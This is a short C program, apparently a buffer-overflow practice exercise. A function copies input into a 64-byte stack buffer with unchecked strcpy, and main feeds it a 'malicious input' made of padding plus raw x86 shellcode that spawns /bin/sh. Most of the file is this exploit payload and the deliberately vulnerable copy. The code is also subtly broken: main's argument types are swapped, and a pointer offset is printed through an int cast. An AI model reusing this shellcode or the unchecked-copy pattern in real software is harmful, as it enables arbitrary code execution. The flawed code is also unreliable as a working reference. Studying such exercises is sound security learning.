#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

void overflow(char *input_str) {
	char buff[64];
	strcpy(buff, input_str);
	puts(input_str);
}

int main(char* argv[], int argc) {
	//our malicious input will look something like this, containing 56 bad chars, so we need 8 padding chars.
	char rand_str[] = "aaaabbb"	
	"\xeb\x24\x5e\x89\x74\x24\x08\x31"
	"\xc0\x88\x44\x24\x07\x89\x44\x24"
	"\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
	"\x08\x8d\x54\x24\x0c\xcd\x80\x31"
	"\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
	"\xff\xff\xff"
	"/bin/sh"
	"\x6c\x73\x20\x2d\x6c\x61";

	 uintptr_t diff = (uintptr_t) __builtin_frame_address(0) - (uintptr_t) rand_str;
	 printf("%p\n", (int) diff);
	
	// char rand_str[64];
	// gets(rand_str);
	overflow(rand_str);
	return 0;
}
